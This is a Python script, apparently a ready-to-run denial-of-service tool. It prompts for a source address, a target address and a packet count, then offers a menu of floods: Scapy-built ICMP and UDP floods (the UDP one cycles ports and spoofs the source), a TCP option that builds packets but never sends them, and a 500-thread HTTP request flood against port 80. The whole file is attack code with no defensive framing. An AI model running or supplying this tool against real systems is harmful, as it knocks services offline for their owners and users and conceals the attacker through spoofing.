from scapy.all import *
import threading 
import socket




def myICMP():
    print("Starting ICMP DDOS")
    for x in range(0,int(amountOfPackets)):
        send(IP(dst=destAddy)/ICMP()/"DDOS",count = 100)

def myTCP():
    print("Starting TCP DDOS")
    for x in range(0,int(amountOfPackets)):
        tcp_pkt = Ether(src = srcAddy) / IP(dst = destAddy) / TCP(dport=44)

def myUDP():
    print("Starting UDP DDOS")
    attacker = IP(src=srcAddy,dst=destAddy)
    message = "DDOS"
    prt = 1
    i = 1
    for x in range(0,int(amountOfPackets)):
        send(attacker/UDP(dport = prt)/message,count = 100)
        prt = prt+1
        print("Total Packets Sent = :",i)
        i = i+1
        if prt == 65534:
            prt = 1



def socketAttack():
    print("Starting Multithreading socket DDOS")
    for i in range(500):
        thread = threading.Thread(target = attack)
        thread.start()
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((destAddy,80))
        s.sendto(("GET /" + destAddy + " HTTP/1.1\r\n").encode("ascii"), (destAddy,80))
        s.sendto(("Host: " + srcAddy + "\r\n\r\n").encode("ascii"), (destAddy,80))
        s.close()

def switch(num):
    if int(num)==1:
        myICMP()
    elif int(num)==2:
        myTCP()
    elif int(num) ==3:
        myUDP()
    elif int(num)==4:
        socketAttack()
    else:
        print("Enter 1-4")
        switch(input())


print("\nINPUT SOURCE ADDRESS\n")
srcAddy = input()
print("\nINPUT DESTINATION ADDRESS\n")
destAddy = input()
print("\nINPUT AMOUNT OF PACKETS TO SEND\n")
amountOfPackets = input()

print("Select Type of Attack:\n 1.ICMP SCAPY \n 2.TCP SCAPY \n 3.UDP SCAPY \n 4. Multithreading socket HTTP attack\n")
switch(input())



